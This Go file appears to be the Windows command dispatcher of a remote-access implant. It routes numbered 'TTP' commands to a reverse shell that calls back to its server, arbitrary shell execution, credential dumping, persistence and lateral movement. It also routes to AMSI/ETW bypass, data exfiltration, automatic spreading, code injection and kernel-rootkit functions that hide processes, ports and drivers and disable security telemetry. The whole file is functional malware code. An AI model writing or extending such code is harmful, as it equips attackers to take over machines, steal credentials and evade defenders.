package ttp

import (
	"fmt"
	"net"
	"os"
)

// Dispatch executes a Windows TTP by number.
// Signature is identical to Linux Dispatch for aux.go / protocol compatibility.
func Dispatch(ttpNum int, params string, serverAddr string, agentID string, secret string, rawsockCBAddr string) (string, error) {
	switch ttpNum {

	case 1:
		name := "svchost.exe"
		if params != "" {
			name = params
		}
		if err := Masquerade(name); err != nil {
			return "", err
		}
		return fmt.Sprintf("[masquerade] title set to %q", name), nil

	case 2:
		host, _, _ := net.SplitHostPort(serverAddr)
		// Cloudflare doesn't proxy :4445 -- use relay direct host from rawsockCBAddr
		if relayHost, _, err2 := net.SplitHostPort(rawsockCBAddr); err2 == nil && relayHost != "" {
			host = relayHost
		}
		if err := ReverseShell(host, 4445); err != nil {
			return "", err
		}
		return "[revshell] session ended", nil

	case 4:
		out, err := ShellExec(params)
		if err != nil {
			return out, err
		}
		return out, nil

	case 5:
		cmd, err := Beacon(serverAddr, agentID, 0, "", "")
		if err != nil {
			return "", err
		}
		return fmt.Sprintf("[beacon] extra check-in, server replied ttp=%d", cmd.TTP), nil

	case 6, 40:
		method := params
		if method == "" {
			method = "all"
		}
		return Persist(method)

	case 7, 41:
		return CredDump()

	case 42:
		return WinLateral(params)

	case 43:
		return AMSIBypass()

	case 44:
		return ETWBypass()

	case 30:
		return ExfilManual(params)

	case 31:
		return ExfilAuto()

	case 32:
		return ExfilStaged(params)

	case 34:
		return NetMap(params)

	case 35:
		return AutoSpread()

	case 36:
		return SMBProbe(params)

	// ── Userland injection (no driver required) ──────────────────────────
	case 50:
		// DLL injection: "pid dllpath [apc]"
		return InjectDLL(params)

	case 51:
		// Shellcode injection: "pid b64:<b64>|file:<path> [apc]"
		return InjectShellcode(params)

	// ── Nidhogg kernel TTPs (require TTP 1000 first) ─────────────────────
	case 60:
		// Hide/unhide process: "pid|self [pid:unhide]"
		return NidhoggHideProcess(params)

	case 61:
		// Protect/unprotect process from termination: "pid|self [pid:unprotect]"
		return NidhoggProtectProcess(params)

	case 62:
		// Elevate process to SYSTEM: "pid|self"
		return NidhoggElevateProcess(params)

	case 62<<8 | 1: // TTP 15873: set PP/PPL signature level
		// "pid signerType signatureSigner"
		return NidhoggSetProcessSignature(params)

	case 63:
		// Hide registry key/value: "HKLM\...\key" | "HKLM\...:valuename"
		return NidhoggHideRegItem(params)

	case 63<<8 | 1: // TTP 16129: protect registry key/value
		return NidhoggProtectRegItem(params)

	case 63<<8 | 2: // TTP 16130: unhide registry key/value
		return NidhoggUnhideRegItem(params)

	case 63<<8 | 3: // TTP 16131: unprotect registry key/value
		return NidhoggUnprotectRegItem(params)

	case 64:
		// Hide thread: "tid|self [tid:unhide]"
		return NidhoggHideThread(params)

	case 64<<8 | 1: // TTP 16385: protect thread
		return NidhoggProtectThread(params)

	case 65:
		// Hide port: "port/tcp|udp[/remote]"
		return NidhoggHidePort(params)

	case 66:
		// Protect file from deletion: "C:\path\to\file" | "" (self)
		return NidhoggProtectFile(params)

	case 67:
		// ETW-TI disable/enable: "" | "enable"
		return NidhoggETWTIDisable(params)

	case 68:
		// Remove kernel callback: "0xaddr/type"
		return NidhoggRemoveCallback(params)

	case 69:
		// Hide/unhide driver: "drivername" | "drivername:unhide" | "" (self=nidhogg)
		return NidhoggHideDriver(params)

	case 70:
		// Hide/restore module from PEB: "pid modulename.dll[:unhide]"
		return NidhoggHideModule(params)

	case 71:
		// Kernel DLL injection (bypasses EDR hooks): "pid dllpath [apc]"
		return NidhoggKernelInjectDLL(params)

	case 72:
		// Execute COFF/BOF in kernel: "entryname b64:<coff> [b64:<params>]"
		return NidhoggExecNof(params)

	case 1000:
		// Deploy Nidhogg driver: "" | "path_to_sys"
		// Driver bytes must be pre-staged or path must exist
		sysPath := ""
		if params != "" {
			sysPath = params
		}
		return NidhoggDeploy(sysPath, nil)

	case 1001:
		// Unload Nidhogg driver
		return NidhoggUnload()

	case 99:
		os.Exit(0)
		return "", nil

	case 222:
		SelfDestruct()
		return "", nil // unreachable

	default:
		return "", fmt.Errorf("unknown TTP %d", ttpNum)
	}
}
